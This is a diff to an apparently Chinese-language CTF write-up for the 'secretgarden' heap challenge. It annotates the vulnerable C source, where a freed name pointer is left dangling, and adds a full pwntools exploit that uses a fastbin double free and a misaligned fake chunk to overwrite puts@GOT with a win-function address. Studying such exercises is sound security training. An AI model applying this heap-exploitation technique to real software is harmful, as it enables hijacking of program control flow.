@@ -25,7 +25,7 @@ struct flower{			//结构体
 };
 
 
-struct flower* flowerlist[100] ;
+struct flower* flowerlist[100] ;		
 unsigned int flowercount = 0 ;
 
 
@@ -46,7 +46,7 @@ void menu(){			//就是打印一些东西,不用看
 }
 
 int add(){
-	struct flower *newflower = NULL ;
+	struct flower *newflower = NULL ;		//首先是创建一个空的结构体指针
 	char *buf = NULL ;
 	unsigned size =0;
 	unsigned index ;
@@ -91,7 +91,7 @@ int del(){
 			return 0 ;
 		}
 		(flowerlist[index])->vaild = 0 ;		//结构体的valid置零
-		free((flowerlist[index])->name);		//把名称的部分free掉,但是没有置零,存在漏洞
+		free((flowerlist[index])->name);		//把名称的部分free掉,但是没有置零,存在垂悬指针,可以进行double free
 		puts("Successful");
 	}
 }
@@ -176,4 +176,55 @@ int main(){
 		}
 	}
 }
+```
+我们可以考虑通过double free,和fastbin_dup将堆的位置弄在put_got附近,然后再修改该堆空间,修改put_got,期间用到为了满足fastbin大小的要求,需要对put_got进行错位查找
+
+通常下我们再got位置附近错位,会找到0x60的位置,那么我们申请堆空间的时候,大小要填写0x50
+
+最终的exp如下
+```
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+from pwn import *
+
+
+r = process('./secretgarden')
+
+def raiseflower(length,name,color):
+    r.recvuntil(":")
+    r.sendline("1")
+    r.recvuntil(":")
+    r.sendline(str(length))
+    r.recvuntil(":")
+    r.sendline(name)
+    r.recvuntil(":")
+    r.sendline(color)
+
+def visit():
+    r.recvuntil(":")
+    r.sendline("2")
+
+def remove(idx):
+    r.recvuntil(":")
+    r.sendline("3")
+    r.recvuntil(":")
+    r.sendline(str(idx))
+
+def clean():
+    r.recvuntil(":")
+    r.sendline("4")
+
+magic = 0x400c7b		#通过objdump -d ./secretgarden | less
+fake_chunk = 0x601ffa			#这个是错位的位置
+raiseflower(0x50,"da","red")
+raiseflower(0x50,"da","red")
+remove(0)
+remove(1)						# 这里就是构造了double free
+remove(0)
+raiseflower(0x50,p64(fake_chunk),"blue")	#放置错位的位置,让其之后可以申请到put_got附近
+raiseflower(0x50,"da","red")
+raiseflower(0x50,"da","red")
+raiseflower(0x50,"a"*6 + p64(0) + p64(magic)*2 ,"red")	#申请到put_got附近,并修改之
+
+r.interactive()
 ```
